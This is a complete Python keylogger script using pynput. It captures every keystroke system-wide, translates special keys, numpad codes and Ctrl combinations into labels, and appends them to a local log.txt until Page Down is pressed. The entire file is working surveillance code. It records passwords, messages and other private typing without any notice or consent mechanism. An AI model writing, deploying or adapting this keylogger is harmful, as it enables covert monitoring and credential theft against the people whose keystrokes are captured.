from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter in ["Key.ctrl_l", "Key.ctrl_r", "Key.shift", "Key.shift_r", "Key.alt_l", "Key.alt_gr"]:
        letter = ""
    elif letter == "Key.space":
        letter = " "
    elif letter == "Key.enter":
        letter = "\n"
    elif letter == "Key.backspace":
        letter = " (Backspace) "
    elif letter == "Key.cmd":
        letter = " (Windows) "
    elif letter == "Key.tab":
        letter = " (Tab) "
    elif letter == "Key.caps_lock":
        letter = " (Caps Lock) "
    elif letter == "Key.num_lock":
        letter = " (Num Lock) "
    elif letter == "Key.scroll_lock":
        letter = " (Scroll Lock) "
    elif letter == "Key.esc":
        letter = " (Esc) "
    elif letter == "Key.delete":
        letter = " (Delete) "
    elif letter == "Key.print_screen":
        letter = " (Print Screen) "
    elif letter == "Key.home":
        letter = " (Home) "
    elif letter == "Key.insert":
        letter = " (Insert) "
    elif letter == "Key.end":
        letter = " (End) "
    elif letter == "Key.page_up":
        letter = " (Page Up) "
    # elif letter == "Key.page_down":
    #     letter = " (Page Down) "
    elif letter == "Key.menu":
        letter = " (Menu) "

    # Media Keys
    elif letter == "Key.media_volume_up":
        letter = " (Volume Up) "
    elif letter == "Key.media_volume_down":
        letter = " (Volume Down) "
    elif letter == "Key.media_volume_mute":
        letter = " (Volume Mute) "
    elif letter == "Key.pause":
        letter = " (Pause) "

    # Directions
    elif letter == "Key.left":
        letter = " (Left Arrow) "
    elif letter == "Key.right":
        letter = " (Right Arrow) "
    elif letter == "Key.up":
        letter = " (Up Arrow) "
    elif letter == "Key.down":
        letter = " (Down Arrow) "

    # Function Keys
    elif letter == "Key.f1":
        letter = " (F1) "
    elif letter == "Key.f2":
        letter = " (F2) "
    elif letter == "Key.f3":
        letter = " (F3) "
    elif letter == "Key.f4":
        letter = " (F4) "
    elif letter == "Key.f5":
        letter = " (F5) "
    elif letter == "Key.f6":
        letter = " (F6) "
    elif letter == "Key.f7":
        letter = " (F7) "
    elif letter == "Key.f8":
        letter = " (F8) "
    elif letter == "Key.f9":
        letter = " (F9) "
    elif letter == "Key.f10":
        letter = " (F10) "
    elif letter == "Key.f11":
        letter = " (F11) "
    elif letter == "Key.f12":
        letter = " (F12) "
    elif letter == "Key.f24":
        letter = " (F24) "

    # Numbers
    elif letter == "<96>":
        letter = "0"
    elif letter == "<97>":
        letter = "1"
    elif letter == "<98>":
        letter = "2"
    elif letter == "<99>":
        letter = "3"
    elif letter == "<100>":
        letter = "4"
    elif letter == "<101>":
        letter = "5"
    elif letter == "<102>":
        letter = "6"
    elif letter == "<103>":
        letter = "7"
    elif letter == "<104>":
        letter = "8"
    elif letter == "<105>":
        letter = "9"
    elif letter == "<110>":
        letter = "."

    # Key Combinations
    elif letter == "\x01":
        letter = " (Ctrl + A) "
    elif letter == "\x02":
        letter = " (Ctrl + B) "
    elif letter == "\x03":
        letter = " (Ctrl + C) "
    elif letter == "\x04":
        letter = " (Ctrl + D) "
    elif letter == "\x05":
        letter = " (Ctrl + E) "
    elif letter == "\x06":
        letter = " (Ctrl + F) "
    elif letter == "\x07":
        letter = " (Ctrl + G) "
    elif letter == "\x08":
        letter = " (Ctrl + H) "
    elif letter == "\t":
        letter = " (Ctrl + I) "
    elif letter == "\n":
        letter = " (Ctrl + J) "
    elif letter == "\x0b":
        letter = " (Ctrl + K) "
    elif letter == "\x0c":
        letter = " (Ctrl + L) "
    elif letter == "\r":
        letter = " (Ctrl + M) "
    elif letter == "\x0e":
        letter = " (Ctrl + N) "
    elif letter == "\x0f":
        letter = " (Ctrl + O) "
    elif letter == "\x10":
        letter = " (Ctrl + P) "
    elif letter == "\x11":
        letter = " (Ctrl + Q) "
    elif letter == "\x12":
        letter = " (Ctrl + R) "
    elif letter == "\x13":
        letter = " (Ctrl + S) "
    elif letter == "\x14":
        letter = " (Ctrl + T) "
    elif letter == "\x15":
        letter = " (Ctrl + U) "
    elif letter == "\x16":
        letter = " (Ctrl + V) "
    elif letter == "\x17":
        letter = " (Ctrl + W) "
    elif letter == "\x18":
        letter = " (Ctrl + X) "
    elif letter == "\x19":
        letter = " (Ctrl + Y) "
    elif letter == "\x1a":
        letter = " (Ctrl + Z) "

    # Stopping the script
    elif letter == "Key.page_down":
        return False

    with open("log.txt", "a") as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()
